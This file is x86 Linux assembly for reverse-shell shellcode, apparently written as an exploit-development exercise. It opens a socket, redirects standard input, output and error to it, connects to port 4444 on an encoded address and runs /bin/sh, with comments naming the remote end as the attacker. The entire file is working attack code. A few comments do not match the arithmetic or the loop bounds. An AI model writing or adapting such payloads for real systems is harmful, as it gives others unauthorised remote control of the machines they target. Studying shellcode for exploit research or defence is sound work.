global _start			

section .text
_start:
    ; setup socket
    xor eax, eax ; we do this both to create a 0x0 value and get eax ready
    push eax ; push 0x0 as third arg
    push 0x1 ; for second arg, the value of SOCK_STREAM
    push 0x2 ; first arg is AF_INET, set address family to ipv4
    xor ecx, ecx ; clear out ecx
    mov ecx, esp ; move our arg values into ecx (place a pointer to these values with an address stored in ecx)
    mov al, 102   ; we move the socketcall syscall value into al, to avoid padding
    mov bl, 1     ; we set function to 1, which is the value of socket
    int 0x80 ; call system interrupt 
    mov esi, eax ; we store the returning value of our syscall for later use in other functions

 ; dup (redirect in, out, err to the attacker)
    mov ebx, eax ; store returned fd from previous syscall (satisfy arg1)
    xor ecx,ecx

loop:
    mov al, 63
    int 0x80 ; call DUP
    inc ecx ; increase by 1
    cmp cl, 0x4 ; run through 0,1,2
    jne loop ; continue when it hits 3
    
    ;create struct sockaddr
    xor ecx, ecx
    mov ecx, 0x02010180 ; push 128.1.1.2 (flipped, so it actually goes on as 2.1.1.128)
    sub ecx, 0x01010101 ; subtract 1.1.1.1
    push ecx ; push our modified address on
    push word 0x5C11 ; push on reversed value of 4444
    push word 0x2 ; push value of AF_INET
    mov ecx, esp ; store our created sockaddr struc in ecx
    push 0x10 ; push length of address on (16) third arg
    push ecx ; push our created structure on as second arg
    push esi ; push created socket fd on as first arg
    mov ecx, esp ; move our values into ecx for the syscall
    mov bl, 3 ; we set function to 3, which is the value of connect
    xor eax, eax
    mov al, 102
    int 0x80

    ; spawn shell
    xor eax, eax
    push eax

    push 0x68732f6e
    push 0x69622f2f

    mov ebx, esp ; the null and //bin/sh get moved into ebx
    push eax ; push another null onto stack
    mov edx, esp ; move the null into edx
    push ebx ; the null and //bin/sh get pushed back onto stack
    mov ecx, esp ; they then get moved into ecx
    mov al, 11
    int 0x80
